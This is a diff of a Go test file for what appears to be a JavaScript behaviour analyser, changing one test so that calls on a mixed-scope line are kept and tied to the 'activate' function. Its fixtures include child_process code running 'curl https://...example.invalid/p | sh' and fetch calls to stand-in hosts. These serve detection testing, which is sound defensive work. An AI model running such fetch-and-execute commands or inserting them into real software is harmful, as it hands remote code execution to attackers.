@@ -672,7 +672,7 @@ cp.exec("curl https://clean-parameter-sibling.example.invalid/p | sh");
 		{
 			name: "generator function",
 			body: `const cp = require("child_process");
-function* poisoned() {
+function* poisoned(cp) {
 mutate(cp);
 yield value;
 }
@@ -891,7 +891,7 @@ const command = "curl https://object-method.example.invalid/p | sh";
 	}
 }
 
-func TestExtractTextRejectsMixedJavaScriptScopesOnOneLine(t *testing.T) {
+func TestExtractTextKeepsMixedJavaScriptScopesSeparate(t *testing.T) {
 	tests := []string{
 		`noop(); function activate() { fetch("https://same-line-fetch.example.invalid/p"); }`,
 		`const cp = require("child_process");
@@ -903,10 +903,15 @@ noop(); function activate() { cp.exec("curl https://same-line-scope.example.inva
 		content.ExecutionRootIDs = []string{"root-test"}
 		var graph behavior.Graph
 		ExtractText(&graph, content)
-		if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
-			t.Fatalf("mixed physical-line scopes produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
+		if len(graph.Operations) == 0 {
+			t.Fatal("exact mixed-line calls were not retained")
 		}
-		if !hasPartialCoverageArea(graph.Coverage, "javascript-structural-analysis") {
+		for _, operation := range graph.Operations {
+			if operation.SourceFunction != "activate" || operation.Execution.Connectivity != behavior.ConnectivityUnknown || len(operation.Execution.ExecutionRootIDs) != 0 {
+				t.Fatalf("mixed physical-line operation inherited module execution: %#v", operation)
+			}
+		}
+		if !hasPartialCoverageArea(graph.Coverage, javaScriptASTAnalysisArea) {
 			t.Fatalf("mixed physical-line scopes were not disclosed: %#v", graph.Coverage)
 		}
 	}
